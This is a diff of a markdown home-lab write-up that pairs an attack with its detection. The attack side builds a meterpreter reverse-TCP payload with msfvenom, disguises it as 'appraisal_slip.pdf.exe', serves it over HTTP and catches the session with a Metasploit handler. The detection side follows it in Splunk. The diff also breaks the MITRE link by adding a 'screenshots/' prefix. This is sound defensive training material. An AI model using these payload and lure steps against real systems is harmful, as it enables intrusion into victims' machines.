@@ -50,7 +50,7 @@ nmap -A <victim_ip> -Pn
 
 **Finding:** Port **3389 (RDP)** was found open on the victim machine.
 
-> ![Nmap Open Port Scan](namp_open_port.png)
+> ![Nmap Open Port Scan](screenshots/namp_open_port.png)
 
 **Threat Hunter Note:** An open RDP port is a high-value finding for attackers. It confirms the target is reachable and hints at potential lateral movement or brute-force vectors. Legitimate organizations should never expose RDP directly to untrusted networks.
 
@@ -65,7 +65,7 @@ msfvenom               # View all available options and flags
 msfvenom -l payloads   # List all payloads with descriptions
 ```
 
-> ![Msfvenom Options](msfvenom_options.png) · ![Msfvenom Payloads](msfvenom_paylods.png) · ![Payload Name](payload_name.png)
+> ![Msfvenom Options](screenshots/msfvenom_options.png) · ![Msfvenom Payloads](screenshots/msfvenom_paylods.png) · ![Payload Name](screenshots/payload_name.png)
 
 **Selected Payload:** `windows/x64/meterpreter_reverse_tcp`
 
@@ -92,7 +92,7 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<your_ip> LPORT=4444 -f ex
 | `-f` | `exe` | Output format — generates a Windows executable |
 | `-o` | `appraisal_slip.pdf.exe` | Output filename — disguised as a PDF to deceive the victim |
 
-> ![Payload Created](payload_created.png)
+> ![Payload Created](screenshots/payload_created.png)
 
 **Social Engineering Note:** The filename `appraisal_slip.pdf.exe` is a deliberate deception technique. Windows hides file extensions by default, so a victim may only see `appraisal_slip.pdf` — triggering curiosity and trust. This mirrors real-world spear-phishing lures targeting employees.
 
@@ -104,7 +104,7 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<your_ip> LPORT=4444 -f ex
 ls
 ```
 
-> ![Payload Present](payload_present.png)
+> ![Payload Present](screenshots/payload_present.png)
 
 Confirms the payload `appraisal_slip.pdf.exe` was successfully generated in the current working directory.
 
@@ -118,14 +118,14 @@ The attacker now arms Metasploit to receive the incoming reverse connection.
 msfconsole
 ```
 
-> ![Msfconsole UI](msfconsole_ui.png)
+> ![Msfconsole UI](screenshots/msfconsole_ui.png)
 
 ```bash
 use exploit/multi/handler   # Load the generic payload handler
 options                     # Inspect configurable parameters
 ```
 
-> ![Handler Options](handler_options.png)
+> ![Handler Options](screenshots/handler_options.png)
 
 ```bash
 set payload windows/x64/meterpreter_reverse_tcp   # Match the payload used in msfvenom
@@ -134,7 +134,7 @@ options                                            # Confirm all settings are co
 exploit                                            # Start listening
 ```
 
-> ![Handler All Set](allset.png)
+> ![Handler All Set](screenshots/allset.png)
 
 **Why `multi/handler`?**  
 It is the universal catcher for staged and stageless payloads. It listens passively until the victim executes the payload and the reverse connection arrives — at which point a full Meterpreter session is established.
@@ -167,7 +167,7 @@ http://<attacker_ip>:9999
    ```
    http://<attacker_ip>:9999
    ```
-   > ![HTTP Server Listing](listing.png)
+   > ![HTTP Server Listing](screenshots/listing.png)
 
 2. The directory listing is visible. Click on `appraisal_slip.pdf.exe` and **download it**.
 
@@ -211,7 +211,7 @@ Look for an **ESTABLISHED** outbound connection from `appraisal_slip.pdf.exe` to
 index="main" appraisal_slip.pdf.exe
 ```
 
-> ![Splunk Logs](logs.png)
+> ![Splunk Logs](screenshots/logs.png)
 
 **What we see:** Splunk captured events tied to the payload execution — process creation logs confirming `appraisal_slip.pdf.exe` was spawned on the victim host. This is the attacker's **first footprint** in the SIEM.
 
@@ -219,7 +219,7 @@ index="main" appraisal_slip.pdf.exe
 
 ### Query 2 — Network Connection Event
 
-> ![Connection Event](connevent.png)
+> ![Connection Event](screenshots/connevent.png)
 
 Splunk logged an outbound **network connection event** — the victim machine reaching out to the attacker's IP on port 4444. This maps directly to the **C2 beaconing** phase of the attack.
 
@@ -229,11 +229,11 @@ Splunk logged an outbound **network connection event** — the victim machine re
 
 ### Query 3 — Shell Spawn: `cmd.exe` Spawned by Payload
 
-> ![CMD Spawn](spawn.png)
+> ![CMD Spawn](screenshots/spawn.png)
 
 Splunk captured `cmd.exe` being **spawned as a child process** of `appraisal_slip.pdf.exe`. This is the classic process lineage of a reverse shell — a non-browser, non-system binary spawning a command interpreter.
 
-> **MITRE ATT&CK Mapping:** [T1059.003 — Command and Scripting Interpreter: Windows Command Shell](https://attack.mitre.org/techniques/T1059/003/)
+> **MITRE ATT&CK Mapping:** [T1059.003 — Command and Scripting Interpreter: Windows Command Shell](screenshots/https://attack.mitre.org/techniques/T1059/003/)
 
 ---
 
@@ -245,7 +245,7 @@ By copying the **Process GUID** from the spawn event and pivoting in Splunk:
 index="main" <process_guid>
 ```
 
-> ![Recon Logs](recon_logs.png)
+> ![Recon Logs](screenshots/recon_logs.png)
 
 **Commands observed running from the payload's process context:**
 
@@ -267,7 +267,7 @@ Back on Kali, after the victim executes the payload, the Meterpreter session ope
 shell           # Drop into a native Windows shell from Meterpreter
 ```
 
-> ![Meterpreter Shell](shell.png)
+> ![Meterpreter Shell](screenshots/shell.png)
 
 From here, the attacker ran post-exploitation recon:
 
@@ -277,7 +277,7 @@ ipconfig        # Get victim's IP configuration
 net user        # List local accounts on the victim machine
 ```
 
-> ![Victim Info](info.png)
+> ![Victim Info](screenshots/info.png)
 
 Full victim system context acquired. The attacker now has **interactive command execution** on the victim with zero physical access.
 
